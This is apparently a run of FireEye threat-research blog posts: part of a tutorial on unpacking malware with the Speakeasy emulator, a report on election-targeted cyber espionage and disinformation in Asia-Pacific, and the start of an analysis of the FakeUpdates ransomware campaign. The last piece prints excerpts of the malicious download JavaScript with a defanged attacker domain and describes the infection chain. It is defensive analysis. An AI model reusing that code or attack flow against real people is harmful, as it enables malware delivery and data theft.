          func, params):<br />              return 0</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 5: The GetSysColor hook returns 0</span></p>
 <p>If an API function requires more finessed handling, you can
  implement a more specific and meaningful hook that suits your needs.
  If your hook implementation is robust enough, you might consider
  contributing it to the Speakeasy project as an API handler!  </p>
 <h4>Adding an API Handler</h4>
 <p>Within the <a
      href="https://github.com/fireeye/speakeasy/tree/master/speakeasy/winenv/api"><span
  class="code">speakeasy/winenv/api</span></a> directory you'll find
    <span class="code">usermode</span> and <span
  class="code">kernelmode</span> subdirectories that contain Python
  files for corresponding binary modules. These files contain the API
  handlers for each module. In <span
  class="code">usermode/kernel32.py</span>, we see a handler defined for
    <span class="code">SetEnvironmentVariable</span> as shown in Figure 6.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">1: @apihook('SetEnvironmentVariable',
          argc=2)<br />  2: def SetEnvironmentVariable(self, emu, argv,
          ctx={}):<br />  3:     '''<br />  4:     BOOL
          SetEnvironmentVariable(<br />  5:         LPCTSTR
          lpName,<br />  6:         LPCTSTR lpValue<br />  7:        
          );<br />  8:     '''<br />  9:     lpName, lpValue =
          argv<br />  10:    cw = self.get_char_width(ctx)<br />  11:   
          if lpName and lpValue:<br />  12:        name =
          self.read_mem_string(lpName, cw)<br />  13:        val =
          self.read_mem_string(lpValue, cw)<br />  14:        argv[0] =
          name<br />  15:        argv[1] = val<br />  16:       
          emu.set_env(name, val)<br />  17:    return True</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 6: API handler for SetEnvironmentVariable</span></p>
 <p>A handler begins with a function decorator (line 1) that defines the
  name of the API and the number of parameters it accepts. At the start
  of a handler, it is good practice to include MSDN's documented
  prototype as a comment (lines 3-8).</p>
 <p>The handler's code begins by storing elements of the <span
  class="code">argv</span> parameter in variables named after their
  corresponding API parameters (line 9). The handler's <span
  class="code">ctx</span> parameter is a dictionary that contains
  contextual information about the API call. For API functions that end
  in an ‘<span class="code">A</span>’ or ‘<span class="code">W</span>’
  (e.g., <span class="code">CreateFileA</span>), the character width can
  be retrieved by passing the <span class="code">ctx</span> parameter to
  the <span class="code">get_char_width</span> function (line 10). This
  width value can then be passed to calls such as <span
  class="code">read_mem_string</span> (lines 12 and 13), which reads the
  emulator’s memory at a given address and returns a string.</p>
 <p>It is good practice to overwrite string pointer values in the <span
  class="code">argv</span> parameter with their corresponding string
  values (lines 14 and 15). This enables Speakeasy to display string
  values instead of pointer values in its API logs. To illustrate the
  impact of updating <span class="code">argv</span> values, examine the
  Speakeasy output shown in Figure 7. In the <span
  class="code">VirtualAlloc</span> entry, the symbolic constant string
    <span class="code">PAGE_EXECUTE_READWRITE</span> replaces the value
    <span class="code">0x40</span>. In the <span
  class="code">GetModuleFileNameA</span> and <span
  class="code">CreateFileA</span> entries, pointer values are replaced
  with a file path.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">KERNEL32.VirtualAlloc(0x0, 0x2b400, 0x3000,
          &quot;PAGE_EXECUTE_READWRITE&quot;) -&gt; 0x7c000<br />
          KERNEL32.GetModuleFileNameA(0x0,
          &quot;C:\\Windows\\system32\\sample.exe&quot;, 0x104) -&gt;
          0x58<br />
          KERNEL32.CreateFileA(&quot;C:\\Windows\\system32\\sample.exe&quot;,
          &quot;GENERIC_READ&quot;, 0x1, 0x0, &quot;OPEN_EXISTING&quot;,
          0x80, 0x0) -&gt; 0x84</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 7: Speakeasy API logs</span></p>
 <h4>Saving the Unpacked Code Address</h4>
 <p>Packed samples often use functions such as <span
  class="code">VirtualAlloc</span> to allocate memory used to store the
  unpacked sample. An effective approach for capturing the location and
  size of the unpacked code is to first hook the memory allocation
  function used by the unpacking stub. Figure 8 shows an example of
  hooking <span class="code">VirtualAlloc</span> to capture the virtual
  address and amount of memory being allocated by the API call.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">1: def virtualalloc_hook(self, emu,
            api_name, func, params):<br />  2:     '''<br />  3:    
            LPVOID VirtualAlloc(<br />  4:        LPVOID
            lpAddress,<br />  5:        SIZE_T dwSize,<br />  6:       
            DWORD  flAllocationType,<br />  7:        DWORD 
            flProtect<br />  8:      );<br />  9:     '''<br />  10:   
            PAGE_EXECUTE_READWRITE = 0x40<br />  11:    lpAddress,
            dwSize, flAllocationType, flProtect = params<br />  12:   
            rv = func(params)<br />  13:    if lpAddress == 0 and
            flProtect == PAGE_EXECUTE_READWRITE:<br />  14:       
            self.logger.debug(&quot;[*] unpack stub VirtualAlloc call,
            saving dump info&quot;)<br />  15:        self.dump_addr =
            rv<br />  16:        self.dump_size = dwSize</span></p> <p>
          <span class="code">17:    return rv</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 8: VirtualAlloc hook to save memory dump information</span></p>
 <p>The hook in Figure 8 calls Speakeasy’s API handler for <span
  class="code">VirtualAlloc</span> on line 12 to allow memory to be
  allocated. The virtual address returned by the API handler is saved to
  a variable named <span class="code">rv</span>. Since <span
  class="code">VirtualAlloc</span> may be used to allocate memory not
  related to the unpacking process, additional checks are used on line
  13 to confirm the intercepted <span class="code">VirtualAlloc</span>
  call is the one used in the unpacking code. Based on prior analysis,
  we’re looking for a <span class="code">VirtualAlloc</span> call that
  receives the <span class="code">lpAddress</span> value <span
  class="code">0</span> and the <span class="code">flProtect</span>
  value <span class="code">PAGE_EXECUTE_READWRITE</span> (<span
  class="code">0x40</span>). If these arguments are present, the virtual
  address and specified size are stored on lines 15 and 16 so they may
  be used to extract the unpacked payload from memory after the
  unpacking code is finished. Finally, on line 17, the return value from
  the <span class="code">VirtualAlloc</span> handler is returned by the hook.</p>
 <h4>Surgical Code Emulation Using API and Code Hooks</h4>
 <p>Speakeasy is a robust emulation framework; however, you may
  encounter binaries that have large sections of problematic code. For
  example, a sample may call many unsupported APIs or simply take far
  too long to emulate. An example of overcoming both challenges is
  described in the following scenario.</p>
 <h4>Unpacking Stubs Hiding in MFC Projects</h4>
 <p>A popular technique used to disguise malicious payloads involves
  hiding them inside a large, open-source MFC project. MFC is short for
    <a
    href="https://docs.microsoft.com/en-us/cpp/mfc/mfc-desktop-applications?redirectedfrom=MSDN&amp;view=vs-2019">Microsoft
    Foundation Class</a>, which is a popular library used to build
  Windows desktop applications. These MFC projects are often arbitrarily
  chosen from popular Web sites such as <a
    href="https://www.codeproject.com/">Code Project</a>. While the MFC
  library makes it easy to create desktop applications, MFC applications
  are difficult to reverse engineer due to their size and complexity.
  They are particularly difficult to emulate due to their large
  initialization routine that calls many different Windows APIs. What
  follows is a description of my experience with writing a Python script
  using Speakeasy to automate unpacking of a custom packer that hides
  its unpacking stub within an MFC project.</p>
 <p>Reverse engineering the packer revealed the unpacking stub is
  ultimately called during initialization of the <span
  class="code">CWinApp</span> object, which occurs after initialization
  of the C runtime and MFC. After attempting to bypass unsupported APIs,
  I realized that, even if successful, emulation would take far too long
  to be practical. I considered skipping over the initialization code
  completely and jumping straight to the unpacking stub. Unfortunately,
  execution of the C-runtime initialization code was required in order
  for emulation of the unpacking stub to succeed.</p>
 <p>My solution was to identify a location in the code that fell after
  the C-runtime initialization but was early in the MFC initialization
  routine. After examining the Speakeasy API log shown in Figure 9, such
  a location was easy to spot. The graphics-related API function <span
  class="code">GetDeviceCaps</span> is invoked early in the MFC
  initialization routine. This was deduced based on 1) MFC is a
  graphics-dependent framework and 2) <span
  class="code">GetDeviceCaps</span> is unlikely to be called during
  C-runtime initialization.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">0x43e0a7: 'kernel32.FlsGetValue(0x0)' -&gt;
          0x4150<br />  0x43e0e3: 'kernel32.DecodePointer(0x7049)' -&gt;
          0x7048<br />  0x43b16a: 'KERNEL32.HeapSize(0x4130, 0x0,
          0x7000)' -&gt; 0x90<br />  0x43e013:
          'KERNEL32.TlsGetValue(0x0)' -&gt; 0xfeee0001<br />  0x43e02a:
          'KERNEL32.TlsGetValue(0x0)' -&gt; 0xfeee0001<br />  0x43e02c:
          'kernel32.FlsGetValue(0x0)' -&gt; 0x4150<br />  0x43e068:
          'kernel32.EncodePointer(0x44e215)' -&gt; 0x44e216<br />
          0x43e013: 'KERNEL32.TlsGetValue(0x0)' -&gt; 0xfeee0001<br />
          0x43e02a: 'KERNEL32.TlsGetValue(0x0)' -&gt; 0xfeee0001<br />
          0x43e02c: 'kernel32.FlsGetValue(0x0)' -&gt; 0x4150<br />
          0x43e068: 'kernel32.EncodePointer(0x704c)' -&gt; 0x704d<br />
          0x43c260: 'KERNEL32.LeaveCriticalSection(0x466f28)' -&gt;
          None<br />  0x422151: 'USER32.GetSystemMetrics(0xb)' -&gt;
          0x1<br />  0x422158: 'USER32.GetSystemMetrics(0xc)' -&gt;
          0x1<br />  0x42215f: 'USER32.GetSystemMetrics(0x2)' -&gt;
          0x1<br />  0x422169: 'USER32.GetSystemMetrics(0x3)' -&gt;
          0x1<br />  <b style="font-size: 12.0px;">0x422184:
            'GDI32.GetDeviceCaps(0x288, 0x58)' -&gt;
      None</b></span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 9: Identifying beginning of MFC code in
    Speakeasy API logs</span></p>
 <p>To intercept execution at this stage I created an API hook for <span
  class="code">GetDeviceCaps</span> as shown in Figure 10. The hook
  confirms the function is being called for the first time on line 2.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">1: def mfc_init_hook(self, emu, api_name,
          func, params):<br />  2:     if not self.trigger_hit:<br />
          3:         self.trigger_hit = True<br />  4:        
          self.h_code_hook =  
          self.add_code_hook(self.start_unpack_func_hook)<br />
          5:         self.logger.debug(&quot;[*] MFC init api hit,
          starting unpack function&quot;)</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 10: API hook set for GetDeviceCaps</span></p>
 <p>Line 4 shows the creation of a code hook using the <span
  class="code">add_code_hook</span> function of the <span
  class="code">Speakeasy</span> class. Code hooks allow you to specify a
  callback function that is called before each instruction that is
  emulated. Speakeasy also allows you to optionally specify an address
  range for which the code hook will be effective by specifying <span
  class="code">begin</span> and <span class="code">end</span> parameters.</p>
 <p>After the code hook is added on line 4, the <span
  class="code">GetDeviceCaps</span> hook completes and, prior to the
  execution of the sample's next instruction, the <span
  class="code">start_unpack_func_hook</span> function is called. This
  function is shown in Figure 11.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">1: def start_unpack_func_hook(self, emu,
          addr, size, ctx):<br />  2:
              self.h_code_hook.disable()<br />  3:     unpack_func_va =
          self.module.get_rva_from_offset(self.unpack_offs) +
          self.module.get_base()<br />  4:
          self.set_pc(unpack_func_va)</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 11: Code hook that changes the
    instruction pointer</span></p>
 <p>The code hook receives the emulator object, the address and size of
  the current instruction, and the context dictionary (line 1). On line
  2, the code hook disables itself. Because code hooks are executed with
  each instruction, this slows emulation significantly. Therefore, they
  should be used sparingly and disabled as soon as possible. On line 3,
  the hook calculates the virtual address of the unpacking function. The
  offset used to perform this calculation was located using a regular
  expression. This part of the example was omitted for the sake of brevity.</p>
 <p>The <span class="code">self.module</span> attribute was previously
  set in the example code shown in Figure 2. It being subclassed from
  the <span class="code">PE</span> class of <span
  class="code">pefile</span> allows us to access useful functions such
  as <span class="code">get_rva_from_offset()</span> on line 3. This
  line also includes an example of <span class="code">using
  self.module.get_base()</span> to retrieve the module's base virtual address.</p>
 <p>Finally, on line 4, the instruction pointer is changed using the
    <span class="code">set_pc</span> function and emulation continues at
  the unpacking code. The code snippets in Figure 10 and Figure 11
  allowed us to redirect execution to the unpacking code after the
  C-runtime initialization completed and avoid MFC initialization code.</p>
 <h4>Dumping and Fixing Unpacked PEs</h4>
 <p>Once emulation has reached the original entry point of the unpacked
  sample, it is time to dump the PE and fix it up. Typically, a hook
  would save the base address of the unpacked PE in an attribute of the
  class as illustrated on line 15 of Figure 8. If the unpacked PE does
  not contain the correct entry point in its PE headers, the true entry
  point may also need to be captured during emulation. Figure 12 shows
  an example of how to dump emulator memory to a file.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">with open(self.output_path, &quot;wb&quot;)
          as up:<br />      mm =
          self.get_address_map(self.dump_addr)<br />     
          up.write(self.mem_read(mm.get_base(),
      mm.get_size()))</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 12: Dumping the unpacked PE</span></p>
 <p>If you are dumping a PE that has already been loaded in memory, it
  will not have the same layout as it does on disk due to differences in
  section alignment. As a result, the dumped PE's headers may need to be
  modified. One approach is to modify each section's <a
      href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_section_header"><span
  class="code">PointerToRawData</span></a> value to match its <span
  class="code">VirtualAddress</span> field. Each section's <span
  class="code">SizeOfRawData</span> value may need to be padded in order
  conform with the <a
      href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32"><span
  class="code">FileAlignment</span></a> value specified in the PE’s
  optional headers. Keep in mind the resulting PE is unlikely to execute
  successfully. However, these efforts will allow most static analysis
  tools to function correctly.</p>
 <p>The final step for repairing the dumped PE is to fix its import
  table. This is a complex task deserving of its own blog post and will
  not be discussed in detail here. However, the first step involves
  collecting a list of library function names and their addresses in
  emulator memory. If you know the <span
  class="code">GetProcAddress</span> API is used by the unpacker stub to
  resolve imports for the unpacked PE, you can call the <span
  class="code">get_dyn_imports</span> function as shown in Figure 13.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">api_addresses =
      self.get_dyn_imports()</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 13: Retrieving dynamic imports</span></p>
 <p>Otherwise, you can query the emulator class to retrieve its symbol
  information by calling the <span class="code">get_symbols</span>
  function as shown in Figure 14.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">symbols = self.get_symbols()</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 14: Retrieve symbol information from
    emulator class</span></p>
 <p>This data can be used to discover the IAT of the unpacked PE and fix
  or reconstruct its import related tables.</p>
 <h4>Putting It All Together</h4>
 <p>Writing a Speakeasy script to unpack a malware sample can be broken
  down into the following steps:</p>
 <ol> <li>Reverse engineer the unpacking stub to identify: 1) where the
    unpacked code will reside or where its memory is allocated, 2) where
    execution is transferred to the unpacked code, and 3) any
    problematic code that may introduce issues such as unsupported APIs,
    slow emulation, or anti-analysis checks.</li> <li>If necessary, set
    hooks to bypass problematic code.</li> <li>Set a hook to identify
    the virtual address and, optionally, the size of the unpacked
  binary.</li> <li>Set a hook to stop emulation at, or after, execution
    of the original entry point of the unpacked code.</li> <li>Collect
    virtual addresses of Windows APIs and reconstruct the PE’s import
  table.</li> <li>Fix the PE’s headers (if applicable) and write the
    bytes to a file for further analysis.</li> </ol>
 <p>For an example of a script that unpacks UPX samples, check out the
    <a
    href="https://github.com/fireeye/speakeasy/blob/master/examples/upx_unpack.py">UPX
    unpacking script</a> in the Speakeasy repository.</p>
 <h4>Conclusion</h4>
 <p>The <a href="https://github.com/fireeye/speakeasy">Speakeasy
  framework</a> provides an easy-to-use, flexible, and powerful
  programming interface that enables analysts to solve complex problems
  such as unpacking malware. Using Speakeasy to automate these solutions
  allows them to be performed at scale. I hope you enjoyed this
  introduction to automating the Speakeasy framework and are inspired to
  begin using it to implement your own malware analysis solutions!</p>
http://www.fireeye.com/blog/threat-research/2020/12/using-speakeasy-emulation-framework-programmatically-to-unpack-malware.html2020-12-01T20:30:00.000Z2020-12-01T20:27:04.218ZElection Cyber Threats in the Asia-Pacific Regionnoemail@noemail.orgYihao Lim<p>In democratic societies, elections are the mechanism for choosing
  heads of state and policymakers. There are strong incentives for
  adversary nations to understand the intentions and preferences of the
  people and parties that will shape a country's future path and to
  reduce uncertainty about likely winners. Mandiant <a
    href="/content/fireeye-www/en_US/mandiant/threat-intelligence.html">Threat
  Intelligence</a> regularly observes cyber espionage operations we
  believe to be seeking election-related information targeting
  governments, civil society, media, and technology organizations around
  the globe. We have also seen disruptive and destructive cyber attacks
  and propaganda campaigns seeking to undermine targeted governments and
  influence the outcomes of electoral contests.</p>
 <p>The 2020 U.S. elections are currently drawing attention to election
  cyber risks, but 2020 has already hosted dozens of elections
  worldwide, with more to come. In the Asia-Pacific region these
  included elections in Taiwan, India, South Korea, and Singapore to
  name a few, with regional elections scheduled for Indonesia in December.</p>
 <p>Given the prevalence of such activity worldwide and Mandiant's
  unique visibility into threat actor activity, we believe it is
  worthwhile to examine trends in adversary targeting of elections in a
  variety of regional contexts because the tactics, techniques, and
  procedures (TTPs) used in one region today may soon be deployed or
  mimicked in other regions.</p>
 <h4>Notable Electoral Targeting in Asia-Pacific Region</h4>
 <p>Mandiant Threat Intelligence tracked numerous elections-related
  incidents in the Asia-Pacific region in recent years. During this
  time, the most prolific regional actor was China, which we observed in
  more than 20 elections-related campaigns most frequently affecting
  Hong Kong and Taiwan. We believe that China's primary motives for
  elections targeting includes monitoring political developments,
  internal stability, and supporting Belt and Road Initiative (BRI) investments.</p>
 <p>Examples of Chinese cyber espionage targeting electoral support
  organizations include:</p>
 <ul> <li>Targeting candidates and related staff associated with the
    November 2019 Hong Kong District Council elections with a malicious
    macro document.</li> <li>Targeting the Australian Parliament in
    February 2019, three months before the country's general
  elections.</li> <li>Compromising Cambodia's National Election
    Commission in mid-2018 based on the use of AIRBREAK malware by
    APT40, possibly looking to understand the impact of the election
    outcome on Belt and Road Initiative (BRI) plans. See our <a
      href="https://www.fireeye.com/blog/threat-research/2018/07/chinese-espionage-group-targets-cambodia-ahead-of-elections.html">blog
    post</a> for more details about this campaign.</li> <li>A spear
    phishing campaign targeting multiple government agencies in
    Southeast Asia in the spring of 2018 to deliver FIREPIT payloads.
    The nature of the lure material and targeting indicate the activity
    was potentially an effort to monitor an upcoming election in the
    affected country.</li> </ul>
 <p>Specifically, Mandiant has observed multiple instances in which
  organizations such as electoral boards and commissions that support or
  help administer elections have been targeted. Both Russian and Chinese
  cyber espionage operations have targeted election administrators and
  government officials since at least 2014. Observed TTPs include
  phishing and strategic website compromise (SWC), also known as
  watering hole attacks.</p>
 <p>For example, in the November 2019 activity targeting Hong Kong
  (previously referenced), Mandiant Threat Intelligence believes that
  candidates or related staff associated with the Hong Kong District
  Council elections were targeted with a malicious macro document just
  prior to the elections based on geolocation information, the
  spear-phishing lure, and other data.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/asia-pacific-election-threats/picture1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: Decoy content from phishing email</span></p>
 <h4>Elections Ecosystem</h4>
 <p>As our readers will know, Mandiant takes a specific approach to
  deconstructing attacks against elections, which we detailed in a <a
    href="/content/fireeye-www/en_US/blog/threat-research/2019/05/framing-the-problem-cyber-threats-and-elections.html">previous
    blog post</a>.</p>
 <p>Our approach examines threats through the lens of risk posed at
  various levels of the elections ecosystem. We break the elections
  threat landscape into distinct attack surfaces to better allow our
  customers and partners to take action. These include the following:</p>
 <ul> <li>Electoral Platforms Affecting Public Opinion</li>
    <li>Electoral Process Support Organizations</li> <li>Core Electoral
    Process Systems</li> </ul>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/asia-pacific-election-threats/picture2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: Attack surfaces associated with
    the electoral process</span></p>
 <h4>Top Target of Election Cyber Threat Activity: Public Opinion</h4>
 <p>Using our ecosystem taxonomy, based on activity observed from 2016
  to 2019, Mandiant Threat Intelligence assesses that actors
  concentrated on &quot;platforms affecting public opinion&quot; much
  more often than &quot;core election systems&quot; such as voting
  machines, or &quot;electoral support organizations&quot; such as
  election commissions.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/asia-pacific-election-threats/picture3.png" alt="" />
  <br /> <span class="type-XS">Figure 3: Electoral platforms affecting
    public opinions are most frequently targeted</span></p>
 <p>Globally, we assess that actors continue to deploy disinformation in
  the form of fabricated news and hoaxes spread primarily via social
  media and counterfeit websites designed to mimic legitimate news
  organizations, which may be picked up by legitimate news
  organizations. In the last several years, we have seen influence
  operations use increasingly creative methods to blend their
  inauthentic messaging with legitimate speech (e.g., by interviewing,
  impersonating, and hiring legitimate journalists or experts, and
  sending letters to the editor to real publications).</p>
 <p>Malicious actors create and spread disinformation with the intent to
  mislead an electorate by causing reputational damage to an individual
  or political party, or by casting doubt regarding a particular issue
  or political process. Influence campaigns also seek to exacerbate
  existing societal divisions.</p>
 <p>In the Asia-Pacific region, Mandiant Threat Intelligence observed
  pro-China threat actors spoof Taiwanese media outlet TVBS (官方網站) to
  promote narratives in line with the People's Republic of China's
  (PRC's) political interests in a coordinated, inauthentic manner. The
  accounts use a variety of tactics in order to pose as Western media
  outlets, including the use of identical or near-identical usernames,
  display names, and profile photos as the accounts of the outlets they imitate.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/asia-pacific-election-threats/picture4.png" alt="" />
  <br /> <span class="type-XS">Figure 4: @TVSBnews quote-tweets People's
    Daily video citing alleged U.S. interference in foreign elections</span></p>
 <p>Public exposure of high-profile information operations, such as
  Russia's interference in the 2016 U.S. presidential election, has
  strengthened perceptions that such operations are effective. It also
  demonstrates the difficulty that open societies face in countering
  this threat, encouraging current and aspiring information operation
  sponsors to grow their efforts. We anticipate that influence
  operations conducted in support of the political interests of
  nation-states will increase in sophistication, volume, and diversity
  of actors through 2020 and beyond.</p>
 <p>In the last 12 months, Mandiant Threat Intelligence observed and
  reported on information operations conducted in support of the
  political interests of numerous countries. During Singapore's 2020
  general elections, the country's first &quot;digital&quot; election,
  Mandiant Threat Intelligence identified multiple inauthentic accounts.
  These accounts did not, however, appear to be acting in a coordinated manner.</p>
 <h4>Outlook and Implications</h4>
 <p>We expect that threat actors will continue to target entities
  associated with elections worldwide for the foreseeable future and may
  expand the scope of this activity as long as the potential rewards of
  these operations outweigh the risks. State-sponsored actors almost
  certainly view targeting the electoral process as an effective means
  of projecting power and collecting intelligence.</p>
 <p>Furthermore, the continuous expansion of the social media landscape
  will likely encourage various actors to pursue information operations
  by promoting preferred narratives, including the use of propagating
  inauthentic or deceptive information. We have already seen tactics
  evolve to avoid detection and incorporate emerging technologies, such
  as &quot;deepfake&quot; or multimedia manipulation technology, to
  advance more believable and impactful information operations, and we
  expect these innovations to continue. Lower tech methods, such as
  outsourcing propaganda activities to real people hired specifically to
  spread false and misleading content, can hinder attribution efforts
  and potentially increase the effectiveness of operations if those
  people have a more specialized understanding of the information environment.</p>
 <p>To battle election threats, there is an urgent need to increase
  public awareness of the threat and inculcate behaviors that reduce the
  risk of compromise or disruption. These include everything from
  rigorously securing email to implementing policy around notification
  of cyber incidents in the supply chain. In addition, governments can
  consider mandating digital imprint requirements for election
  campaigning, increasing fines for electoral fraud, and increasing
  transparency around digital political advertisements. Investment in
  news verification and screening methodologies on search and social
  media platforms as well as public education efforts equipping voters
  and students to distinguish trustworthy information from suspicions
  may also reduce the impact of influence operations.</p>
http://www.fireeye.com/blog/threat-research/2020/11/election-cyber-threats-in-the-asia-pacific-region.html2020-11-22T23:00:00.000Z2020-11-23T00:52:56.093ZPurgalicious VBA: Macro Obfuscation With VBA Purgingnoemail@noemail.orgAndrew OliveauHead Fake: Tackling Disruptive Ransomware Attacksnoemail@noemail.orgBryce Abdo<p>Within the past several months, FireEye has observed
  financially-motivated threat actors employ tactics that focus on
  disrupting business processes by deploying ransomware in mass
  throughout a victim’s environment. Understanding that normal business
  processes are critical to organizational success, these ransomware
  campaigns have been accompanied with multi-million dollar ransom
  amounts. In this post, we’ll provide a technical examination of one
  recent campaign that stems back to a technique that we initially
  reported on in <a
    href="https://www.fireeye.com/blog/threat-research/2018/04/fake-software-update-abuses-netsupport-remote-access-tool.html">April 2018</a>.</p>
 <p>Between May and September 2019, FireEye responded to multiple
  incidents involving a financially-motivated threat actor who leveraged
  compromised web infrastructure to establish an initial foothold in
  victim environments. This activity bared consistencies with a fake
  browser update campaign first identified in April 2018 – now tracked
  by FireEye as <b>FakeUpdates</b>. In this newer campaign, the threat
  actors leveraged victim systems to deploy malware such as <b>Dridex
  </b>or <b>NetSupport</b>, and multiple post-exploitation frameworks.
  The threat actors’ ultimate goal in some cases was to ransom systems
  in mass with BitPaymer or DoppelPaymer ransomware (see Figure 1).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/headfakeransomware/Picture1.png" alt="" />
  <span class="type-XS">
    <br /> Figure 1: Recent FakeUpdates infection chain</span></p>
 <p>Due to campaign proliferation, we have responded to this activity at
  both <a
    href="/content/fireeye-www/en_US/mandiant/managed-detection-and-response.html">Mandiant
    Managed Defense</a> customers and incident response investigations
  performed by Mandiant. Through Managed Defense network and host
  monitoring as well as Mandiant’s incident response findings, we
  observed the routes the threat actor took, the extent of the breaches,
  and exposure of their various toolkits.</p>
 <h4>Knock, Knock: FakeUpdates are Back!</h4>
 <p>In April 2018, FireEye identified a campaign that used compromised
  websites to deliver heavily obfuscated Trojan droppers masquerading as
  Chrome, Internet Explorer, Opera, and/or Firefox browser updates. The
  compromised sites contained code injected directly into the HTML or in
  JavaScript components rendered by the pages which had been injected.
  These sites were accessed by victim users either via HTTP redirects or
  watering-hole techniques utilized by the attackers.</p>
 <p>Since our <a
    href="https://www.fireeye.com/blog/threat-research/2018/04/fake-software-update-abuses-netsupport-remote-access-tool.html">April
    2018 blog post</a>, this campaign has been refined to include new
  techniques and the use of post-exploitation toolkits. Recent
  investigations have shown threat actor activity that included internal
  reconnaissance, credential harvesting, privilege escalation, lateral
  movement, and ransomware deployment in enterprise networks. FireEye
  has identified that a large number of the compromised sites serving up
  the first stage of FakeUpdates have been older, vulnerable Content
  Management System (CMS) applications.</p>
 <h4>You Are Using an Older Version…of our Malware</h4>
 <p>The FakeUpdates campaign begins with a rather intricate sequence of
  browser validation, performed before the final payload is downloaded.
  Injected code on the initial compromised page will make the user’s
  browser transparently navigate to a malicious website using hard-coded
  parameters. After victim browser information is gleaned, additional
  redirects are performed and the user is prompted to download a fake
  browser update. FireEye has observed that the browser validation
  sequence may have additional protections to evade sandbox detections
  and post-incident triage attempts on the compromise site(s).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/headfakeransomware/Picture2.png" alt="" />
  <span class="type-XS">
    <br /> Figure 2: Example of FakeUpdate landing page after HTTP redirects</span></p>
 <p>The redirect process used numerous subdomains, with a limited number
  of IP addresses. The malicious subdomains are often changed in
  different parts of the initial redirects and browser validation stages.</p>
 <p>After clicking the ‘Update’ button, we observed the downloading of
  one of three types of files:</p>
 <ul> <li>Heavily-obfuscated HTML applications (.hta file
  extensions)</li> <li>JavaScript files (.js file extensions)</li>
    <li>ZIP-compressed JavaScript files (.zip extensions)</li> </ul>
 <p>Figure 3 provides a snippet of JavaScript that provides the initial
  download functionality.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="623" valign="top"><p>
          <span class="code">var domain =
            '//gnf6.ruscacademy[.]in/';<br />  var statisticsRequest =
            'wordpress/news.php?b=612626&amp;m=ad2219689502f09c225b3ca0bfd8e333&amp;y=206';<br />
            var statTypeParamName = 'st';</span></p> <p>
          <span class="code">…</span></p> <p>
          <span class="code">var filename = 'download.hta';<br />  var
            browser = 'Chrome';<br />  var special = '1';   <br />  var
            filePlain = window.atob(file64);<br />  var a =
        document.getElementById('buttonDownload');</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 3: Excerpts of JavaScript code identified
    from the FakeUpdates landing pages</span></p>
 <p>When the user opens the initial FakeUpdates downloader, the Windows
  Scripting Host (<i>wscript.exe)</i> is executed and the following
  actions are performed:</p>
 <ol> <li>A script is executed in memory and used to fingerprint the
    affected system.</li> <li>A subsequent backdoor or banking trojan is
    downloaded if the system is successfully fingerprinted.</li> <li>A
    script is executed in memory which:<ul> <li>Downloads and launches a
        third party screenshot utility.</li> <li>Sends the captured
        screenshots to an attacker.</li> </ul> </li> <li>The payload
    delivered in step 2 is subsequently executed by the script
  process.</li> </ol>
 <p>The backdoor and banking-trojan payloads described above have been
  identified as Dridex, NetSupport Manager RAT, AZOrult, and Chthonic
  malware. The strategy behind the selective payload delivery is
  unclear; however, the most prevalent malware delivered during this
  phase of the infection chain were variants of the Dridex backdoor.</p>
 <h4>FakeUpdates: More like FakeHTTP</h4>
 <p>After the end user executes the FakeUpdates download, the victim
  system will send a custom HTTP POST request to a hard-coded Command
  and Control (C2) server. The POST request, depicted in Figure 4,
  showed that the threat actors used a custom HTTP request for initial
  callback. The Age HTTP header, for example, was set to a string of 16
  seemingly-random lowercase hexadecimal characters.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/headfakeransomware/Picture3.png" alt="" />
  <span class="type-XS">
    <br /> Figure 4: Initial HTTP communication after successful
    execution of the FakeUpdates dropper</span></p>
 <p>The HTTP Age header typically represents the time in seconds since
  an object has been cached by a proxy. In this case, via analysis of
  the obfuscated code on disk, FireEye identified that the Age header
  correlates to a scripted “auth header” parameter; likely used by the
  C2 server to validate the request. The first HTTP POST request also
  contains an XOR-encoded HTTP payload variable “<b>a=”</b>.</p>
 <p>The C2 server responds to the initial HTTP request with encoded
  JavaScript. When the code is decoded and subsequently executed, system
  and user information is collected using wscript.exe. The information
  collected from the victim system included:</p>
